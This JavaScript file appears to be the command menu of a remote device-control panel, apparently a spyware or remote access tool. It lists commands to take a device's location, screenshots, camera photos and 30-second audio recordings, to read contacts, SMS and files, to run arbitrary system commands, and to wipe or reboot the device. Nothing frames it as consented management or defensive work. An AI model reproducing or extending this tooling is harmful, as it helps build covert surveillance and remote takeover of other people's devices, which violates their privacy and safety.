// ============================================
// 📚 مكتبة الأوامر المتاحة
// ============================================

const COMMAND_LIBRARY = {
    // أوامر المعلومات
    get_system_info: {
        type: 'get_system_info',
        description: 'جلب معلومات النظام الكاملة',
        icon: 'fa-info-circle',
        params: {
            include: ['battery', 'network', 'storage', 'location']
        }
    },
    
    get_location: {
        type: 'get_location',
        description: 'الحصول على الموقع الجغرافي',
        icon: 'fa-map-marker-alt',
        params: {
            accuracy: 'high'
        }
    },
    
    get_battery: {
        type: 'get_battery',
        description: 'حالة البطارية',
        icon: 'fa-battery-full',
        params: {}
    },
    
    get_network: {
        type: 'get_network',
        description: 'معلومات الشبكة',
        icon: 'fa-wifi',
        params: {}
    },
    
    // أوامر الوسائط
    take_screenshot: {
        type: 'take_screenshot',
        description: 'التقاط لقطة شاشة',
        icon: 'fa-camera',
        params: {
            quality: 'high'
        }
    },
    
    record_audio: {
        type: 'record_audio',        description: 'تسجيل صوتي',
        icon: 'fa-microphone',
        params: {
            duration: 30
        }
    },
    
    get_camera: {
        type: 'get_camera',
        description: 'التقاط صورة بالكاميرا',
        icon: 'fa-camera-retro',
        params: {
            camera: 'front'
        }
    },
    
    // أوامر البيانات
    get_contacts: {
        type: 'get_contacts',
        description: 'جهات الاتصال',
        icon: 'fa-address-book',
        params: {
            limit: 100
        }
    },
    
    get_sms: {
        type: 'get_sms',
        description: 'الرسائل النصية',
        icon: 'fa-sms',
        params: {
            limit: 50
        }
    },
    
    get_files: {
        type: 'get_files',
        description: 'تصفح الملفات',
        icon: 'fa-folder',
        params: {
            path: '/'
        }
    },
    
    // أوامر التحكم
    execute_command: {
        type: 'execute_command',
        description: 'تنفيذ أمر نظام',
        icon: 'fa-terminal',
        params: {            cmd: ''
        }
    },
    
    wipe_data: {
        type: 'wipe_data',
        description: 'مسح البيانات',
        icon: 'fa-trash',
        params: {},
        warning: true
    },
    
    reboot: {
        type: 'reboot',
        description: 'إعادة التشغيل',
        icon: 'fa-power-off',
        params: {},
        warning: true
    }
};

// دوال المساعدة
function getCommandTemplate(commandType) {
    return COMMAND_LIBRARY[commandType] || null;
}

function getAllCommands() {
    return Object.values(COMMAND_LIBRARY);
}

function getCommandByCategory(category) {
    return Object.values(COMMAND_LIBRARY).filter(cmd => cmd.category === category);
}